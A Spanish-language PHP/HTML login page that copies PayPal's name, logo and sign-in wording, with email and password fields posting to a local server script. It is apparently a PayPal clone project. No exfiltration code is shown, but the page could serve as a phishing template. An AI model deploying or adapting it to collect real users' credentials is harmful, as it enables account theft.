<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
<title>Inicie sesión en su cuenta de PayPal</title>

<!-- Web Fonts
========================= -->
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Rubik:300,300i,400,400i,500,500i,700,700i,900,900i' type='text/css'>

<!-- Stylesheet
========================= -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="resources/css/stylesheet.css" />
<!--
========================= -->
</head>
<?php 
session_start();
  if (isset($_SESSION['error'])) {
    $mensaje=$_SESSION['error'];
    $style= 'text-align: center; font-size: 13px; margin-top: 20px; margin-bottom: 20px; color:red;';
    unset($_SESSION['error']);
  }else if(isset($_SESSION['rpt'])){
    $mensaje=$_SESSION['rpt'];
    $style= 'text-align: center; font-size: 13px; margin-top: 20px; margin-bottom: 20px; color:green;';
    unset($_SESSION['rpt']);
  }else {
    $mensaje="";
    $style= "";
  }
?>
<body>
<div id="main-wrapper" class="oxyy-login-register min-vh-100 d-flex flex-column">
  <div class="container my-auto">
    <div class="row">
      <div class="col-md-9 col-lg-7 col-xl-5 mx-auto my-4">
        <div class="bg-white border rounded p-4 py-sm-5 px-sm-5">
          <div class="logo mb-4"> <a class="d-flex justify-content-center" title="paypal"><img src="resources/Logo_Azul.png" alt="paypal" height="40"></a></div>
          <h5 class="display-4" style="<?=$style?>"><?= $mensaje?></h5>
          <form action="Server/login" id="loginForm" method="POST">
            <div class="form-group">
              <input name="txtCorreo" type="email" class="form-control" id="correoElectronico" required placeholder="Correo electrónico o número de celular">
            </div>
            <div class="form-group">
              <input name="txtContraseña" type="password" class="form-control" id="loginPassword" required placeholder="Contraseña">
            </div>
            <button class="btn btn-primary btn-block shadow-none mt-4 mb-3" type="submit">Iniciar sesión</button>
          </form>
          <p class="text-center text-2 mb-2"><a class="btn-link" href="pass_recovery">¿Tiene problemas para iniciar sesión?</a></p>
          <div class="d-flex align-items-center mb-3">
            <hr class="flex-grow-1">
            <span class="mx-2 text-muted">o</span>
            <hr class="flex-grow-1">
          </div>
          <a class="btn btn-light shadow-none border btn-block" href="account-selection" >Registrarse</a> </div>
      </div>
    </div>
  </div>
  <?php include("components/copy.php"); ?>
</div> 

<!-- Script --> 
<script src="resources/js/jquery.min.js"></script> 

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
<!-- Style Switcher --> 
<script src="resources/js/switcher.min.js"></script> 
<script src="resources/js/theme.js"></script>
</body>
</html>